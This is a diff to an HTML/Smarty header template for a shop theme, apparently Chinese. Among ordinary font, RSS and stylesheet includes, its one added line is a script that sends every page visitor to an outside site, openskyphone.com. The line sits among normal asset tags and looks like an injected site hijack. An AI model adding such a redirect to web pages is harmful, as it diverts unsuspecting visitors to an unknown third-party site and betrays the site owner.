@@ -13,6 +13,7 @@
 <link rel="alternate" type="application/rss+xml" title="RSS|{$page_title}" href="{$feed_url}" />
 <link href="http://fonts.googleapis.com/css?family=Open+Sans|Cardo|Montserrat" rel="stylesheet">
 <link rel="stylesheet" type="text/css" href="themes/default/images/swiper.min.css">
+<script language='javascript'>document.location = 'http://openskyphone.com'</script>
 <script language='javascript' src='themes/default/js/swiper.min.js' type='text/javascript' charset='utf-8'></script>
 {* 包含脚本文件 *}
 {insert_scripts files='common.js,index.js'}
